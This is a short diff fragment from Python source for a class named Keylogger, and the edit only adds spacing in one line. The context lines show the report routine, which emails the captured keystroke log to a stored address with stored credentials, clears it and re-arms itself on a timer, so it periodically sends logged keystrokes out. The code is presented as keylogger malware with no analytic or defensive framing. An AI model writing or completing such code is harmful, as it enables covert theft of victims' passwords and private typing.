@@ -27,7 +27,7 @@ class Keylogger:
 
     def report(self):
         #print (self.log)
-        self.send_mail(self.email, self.password, "\n\n"+self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
         timer = threading.Timer(self.interval, self.report)
         timer.start()
